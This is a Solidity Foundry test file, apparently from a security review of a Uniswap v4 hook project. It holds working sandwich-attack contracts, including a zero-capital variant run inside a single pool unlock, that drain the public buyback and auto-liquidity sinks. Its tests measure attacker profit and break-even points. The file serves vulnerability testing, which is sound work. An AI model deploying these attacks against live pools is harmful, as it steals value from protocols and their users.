// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {console} from "forge-std/Test.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {LiquidityAmounts} from "v4-core/test/utils/LiquidityAmounts.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "v4-core/src/test/PoolSwapTest.sol";
import {Swarmlings} from "../../src/Swarmlings.sol";
import {ISwarmlingsHook} from "../../src/interfaces/IHive.sol";
import {BuybackBurn} from "../../src/modules/BuybackBurn.sol";
import {AutoLiquidity} from "../../src/modules/AutoLiquidity.sol";
import {IUnlockCallback} from "v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TransientStateLibrary} from "v4-core/src/libraries/TransientStateLibrary.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {HiveBase} from "../Hive.t.sol";

/// @dev Native-ETH pairing only (ETH is currency0). Buys, pokes the public sink and sells, all in one call.
contract Sandwicher {
    PoolSwapTest immutable router;
    Swarmlings immutable ling;
    PoolKey key;

    constructor(PoolSwapTest r, Swarmlings l, PoolKey memory k) {
        router = r;
        ling = l;
        key = k;
        l.approve(address(r), type(uint256).max);
    }

    receive() external payable {}

    function sandwich(uint256 v, address sink, uint256 pokes) external {
        router.swap{value: v}(
            key,
            SwapParams(true, -int256(v), TickMath.MIN_SQRT_PRICE + 1),
            PoolSwapTest.TestSettings(false, false),
            ""
        );
        for (uint256 i; i < pokes; ++i) {
            try ISink(sink).poke() {} catch {}
        }
        router.swap(
            key,
            SwapParams(false, -int256(ling.balanceOf(address(this))), TickMath.MAX_SQRT_PRICE - 1),
            PoolSwapTest.TestSettings(false, false),
            ""
        );
    }
}

/// @dev The same sandwich with ZERO upfront capital: everything happens inside one v4 unlock, so only the net
/// ETH delta is settled at the end (and it is positive when the attack pays).
contract ZeroCapitalSandwich is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager immutable pm;
    Swarmlings immutable ling;
    PoolKey key;
    int256 public net;

    constructor(IPoolManager m, Swarmlings l, PoolKey memory k) {
        pm = m;
        ling = l;
        key = k;
    }

    receive() external payable {}

    function run(uint256 v, address sink, uint256 pokes) external {
        pm.unlock(abi.encode(v, sink, pokes));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        (uint256 v, address sink, uint256 pokes) = abi.decode(data, (uint256, address, uint256));
        pm.swap(key, SwapParams(true, -int256(v), TickMath.MIN_SQRT_PRICE + 1), "");
        for (uint256 i; i < pokes; ++i) {
            try ISink(sink).poke() {} catch {}
        }
        int256 lingCredit = pm.currencyDelta(address(this), Currency.wrap(address(ling)));
        pm.swap(key, SwapParams(false, -lingCredit, TickMath.MAX_SQRT_PRICE - 1), "");
        net = pm.currencyDelta(address(this), Currency.wrap(address(0)));
        if (net > 0) pm.take(Currency.wrap(address(0)), address(this), uint256(net));
        else if (net < 0) pm.settle{value: uint256(-net)}();
        return "";
    }
}

interface ISink {
    function poke() external;
}

contract FlashSinksTest is HiveBase {
    using StateLibrary for IPoolManager;

    function _priceX(uint160 p) internal pure returns (uint256) {
        // ETH per LING scaled 1e18 ... price = sqrtP^2 / 2^192 is LING per ETH here (currency1/currency0)
        return uint256(p) * uint256(p) >> 96; // (LING per ETH) * 2^96 / 1
    }

    /// @dev accumulate `target` ETH of claims for `sink` with the poke flag off, then switch it on.
    function _backlog(address sink, uint16 bps, uint256 target) internal {
        _govern(abi.encodeCall(ISwarmlingsHook.setSlices, (_slice(sink, bps, false))));
        vm.prank(alice);
        ling.setSkipNFT(true);
        uint256 guard;
        while (_claims(sink, reward) < target && guard++ < 40) {
            _buyExactIn(alice, 3 ether);
            _sellExactIn(alice, ling.balanceOf(alice));
        }
        _govern(abi.encodeCall(ISwarmlingsHook.setSlices, (_slice(sink, bps, true))));
    }

    // ---------------------------------------------------------------- BuybackBurn sandwich sweep

    function test_buybackSandwichSweep() public {
        BuybackBurn b = new BuybackBurn(hook, 1);
        _backlog(address(b), 375, 2 ether);
        console.log("backlog (wei):", _claims(address(b), reward));
        Sandwicher s = new Sandwicher(swapRouter, ling, launchKey);
        uint256[5] memory vs = [uint256(0.5 ether), 1 ether, 2 ether, 3 ether, 10 ether];
        uint256[4] memory ns = [uint256(10), 20, 30, 45];
        int256 best = type(int256).min;
        for (uint256 i; i < vs.length; ++i) {
            for (uint256 j; j < ns.length; ++j) {
                uint256 snap = vm.snapshotState();
                vm.deal(address(s), vs[i]);
                uint256 before = address(s).balance;
                s.sandwich(vs[i], address(b), ns[j]);
                int256 pnl = int256(address(s).balance) - int256(before);
                if (pnl > best) best = pnl;
                console.log("V / pokes / sinkSpent / burned");
                console.log(vs[i], ns[j]);
                console.log(b.spent(), b.burned());
                console.log("attacker pnl (wei):");
                console.logInt(pnl);
                vm.revertToState(snap);
            }
        }
        console.log("best attacker pnl (wei):");
        console.logInt(best);
    }

    function _bestSandwich(Sandwicher s, address sink) internal returns (int256 best, uint256 bv, uint256 bn) {
        uint256[3] memory vs = [uint256(1 ether), 3 ether, 10 ether];
        uint256[5] memory ns = [uint256(5), 10, 20, 30, 45];
        best = type(int256).min;
        for (uint256 i; i < vs.length; ++i) {
            for (uint256 j; j < ns.length; ++j) {
                uint256 snap = vm.snapshotState();
                vm.deal(address(s), vs[i]);
                uint256 before = address(s).balance;
                s.sandwich(vs[i], sink, ns[j]);
                int256 pnl = int256(address(s).balance) - int256(before);
                if (pnl > best) {
                    best = pnl;
                    bv = vs[i];
                    bn = ns[j];
                }
                vm.revertToState(snap);
            }
        }
    }

    /// @dev Break-even: how large must a sink backlog be (relative to the pool's ETH reserve ~10 ETH) before a
    /// buy -> n x poke() -> sell sandwich pays.
    function test_buybackBreakEven() public {
        BuybackBurn b = new BuybackBurn(hook, 1);
        uint256[5] memory targets = [uint256(0.25 ether), 0.5 ether, 0.75 ether, 1 ether, 1.5 ether];
        Sandwicher s = new Sandwicher(swapRouter, ling, launchKey);
        for (uint256 t; t < targets.length; ++t) {
            uint256 snapT = vm.snapshotState();
            _backlog(address(b), 375, targets[t]);
            uint256 backlog = _claims(address(b), reward);
            (int256 best, uint256 bv, uint256 bn) = _bestSandwich(s, address(b));
            console.log("backlog / bestV / bestPokes");
            console.log(backlog, bv, bn);
            console.log("best pnl:");
            console.logInt(best);
            vm.revertToState(snapT);
        }
    }

    /// @dev Same pokes with no attacker: what the buyback would burn for the same spend.
    function test_buybackHonestBaseline() public {
        BuybackBurn b = new BuybackBurn(hook, 1);
        _backlog(address(b), 375, 2 ether);
        uint256[3] memory ns = [uint256(10), 20, 30];
        for (uint256 j; j < ns.length; ++j) {
            uint256 snap = vm.snapshotState();
            for (uint256 k; k < ns[j]; ++k) {
                try b.poke() {} catch {}
            }
            console.log("honest pokes / spent / burned");
            console.log(ns[j], b.spent(), b.burned());
            vm.revertToState(snap);
        }
    }

    // ---------------------------------------------------------------- AutoLiquidity sandwich sweep

    function test_autoLiquiditySandwichSweep() public {
        AutoLiquidity a = new AutoLiquidity(hook, 1 ether);
        // slice with poke=false collects the threshold, then the sink is armed
        _govern(abi.encodeCall(ISwarmlingsHook.setSlices, (_slice(address(a), 375, false))));
        vm.prank(alice);
        ling.setSkipNFT(true);
        uint256 guard;
        while (_claims(address(a), reward) < 1 ether && guard++ < 40) {
            _buyExactIn(alice, 3 ether);
            _sellExactIn(alice, ling.balanceOf(alice));
        }
        _govern(abi.encodeCall(ISwarmlingsHook.setSlices, (_slice(address(a), 375, true))));
        console.log("threshold backlog:", _claims(address(a), reward));
        Sandwicher s = new Sandwicher(swapRouter, ling, launchKey);
        uint256[4] memory vs = [uint256(1 ether), 3 ether, 10 ether, 30 ether];
        int256 best = type(int256).min;
        for (uint256 i; i < vs.length; ++i) {
            uint256 snap = vm.snapshotState();
            (uint160 p0,,,) = manager.getSlot0(launchKey.toId());
            vm.deal(address(s), vs[i]);
            uint256 before = address(s).balance;
            s.sandwich(vs[i], address(a), 1);
            int256 pnl = int256(address(s).balance) - int256(before);
            (uint160 p1,,,) = manager.getSlot0(launchKey.toId());
            if (pnl > best) best = pnl;
            console.log("V(ETH e18), batches added:");
            console.log(vs[i], a.batches());
            console.logInt(pnl);
            console.log("sqrt price before/after:");
            console.log(p0, p1);
            vm.revertToState(snap);
        }
        console.log("best attacker pnl (wei):");
        console.logInt(best);
    }

    /// @dev Headline PoC: backlog of ~2.17 ETH in a 10 ETH-reserve pool, attacker with ZERO ETH.
    function test_zeroCapitalBuybackSandwich() public {
        BuybackBurn b = new BuybackBurn(hook, 1);
        _backlog(address(b), 375, 2 ether);
        ZeroCapitalSandwich z = new ZeroCapitalSandwich(manager, ling, launchKey);
        assertEq(address(z).balance, 0);
        uint256 lingSupply = ling.totalSupply();
        z.run(3 ether, address(b), 45);
        console.log("attacker started with 0 ETH, ended with (wei):", address(z).balance);
        console.log("sink spent / LING burned:", b.spent(), b.burned());
        console.log("whole LING burned per ETH spent (honest drip ~39.8M):", (b.burned() / 1e18) * 1e18 / b.spent());
        assertGt(address(z).balance, 0.4 ether);
        assertEq(lingSupply - ling.totalSupply(), b.burned());
    }
}
